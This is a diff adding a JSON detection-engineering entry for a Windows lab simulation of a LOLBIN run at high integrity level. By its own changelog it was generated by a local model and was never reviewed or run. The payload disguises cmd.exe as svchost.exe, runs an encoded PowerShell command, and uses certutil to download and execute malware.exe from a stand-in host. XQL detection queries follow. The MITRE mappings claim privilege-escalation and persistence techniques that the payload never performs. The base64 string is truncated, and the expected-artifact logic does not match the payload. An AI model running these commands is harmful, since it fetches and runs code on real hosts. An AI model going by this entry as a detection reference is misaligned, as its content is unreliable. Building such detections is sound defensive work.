@@ -1,0 +1,195 @@
+{
+  "id": "TTP-0000-0110",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "LOLBIN Process Execution with High Integrity Level",
+    "summary": "An attacker executes a legitimate Windows binary with elevated privileges to gain system access and execute malicious code. Cortex should detect the use of a LOLBIN with high integrity level.",
+    "description": "An attacker executes a legitimate Windows binary with elevated privileges to gain system access and execute malicious code. Cortex should detect the use of a LOLBIN with high integrity level."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1068",
+        "name": "Exploitation for Privilege Escalation",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      },
+      {
+        "technique_id": "T1547",
+        "subtechnique_id": "T1547.001",
+        "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "tactic_ids": [
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Persistence"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "copy C:\\Windows\\System32\\cmd.exe C:\\temp\\svchost.exe\n\ncd C:\\temp\n\nsvchost.exe /c powershell.exe -enc JABwAHMAZQB1AGQAbwAgAC0AcAByAG8AdABvAHQAaQBjAHQAIABwAHcA\n\nsvchost.exe /c certutil.exe -urlcache -split -f http://192.0.2.10/malware.exe C:\\temp\\malware.exe\n\nsvchost.exe /c C:\\temp\\malware.exe",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "LOLBIN process executed with high integrity level",
+        "expected_value": "action_process_image_name = 'svchost.exe' and actor_process_image_name = 'cmd.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Malware binary downloaded to disk",
+        "expected_value": "action_file_path = 'C:\\\\temp\\\\malware.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "C2 communication to test network",
+        "expected_value": "action_remote_ip = '192.0.2.10' and dst_ip = '192.0.2.10'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "LOLBIN Process with High Integrity",
+        "description": "Detection of a legitimate Windows binary (LOLBIN) executed with high integrity privileges",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in ('svchost.exe', 'powershell.exe', 'certutil.exe')\n| filter actor_process_image_name = 'cmd.exe'\n| filter process_integrity_level = 'high'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1068",
+          "T1547.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious LOLBIN Execution Chain",
+        "description": "Detects a sequence of legitimate binaries used to execute malicious code with elevated privileges",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in ('svchost.exe', 'powershell.exe', 'certutil.exe')\n| filter actor_process_image_name = 'cmd.exe'\n| filter process_integrity_level = 'high'\n| filter causality_actor_process_image_name = 'cmd.exe'\n| filter action_file_path contains 'temp'\n| filter action_remote_ip = '192.0.2.10'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "cmd.exe executing svchost.exe with elevated privileges",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1068",
+          "T1547.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "LOLBIN High Integrity Execution Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in ('svchost.exe', 'powershell.exe', 'certutil.exe')\n| filter actor_process_image_name = 'cmd.exe'\n| filter process_integrity_level = 'high'\n| filter action_file_path contains 'temp'\n| filter action_remote_ip = '192.0.2.10'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — LOLBIN process executed with a high integrity level; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/lolbin-process-executed-with-a-high-integrity-level"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: LOLBIN process executed with a high integrity level",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/lolbin-process-executed-with-a-high-integrity-level",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1068",
+      "url": "https://attack.mitre.org/techniques/T1068/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1547.001",
+      "url": "https://attack.mitre.org/techniques/T1547/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
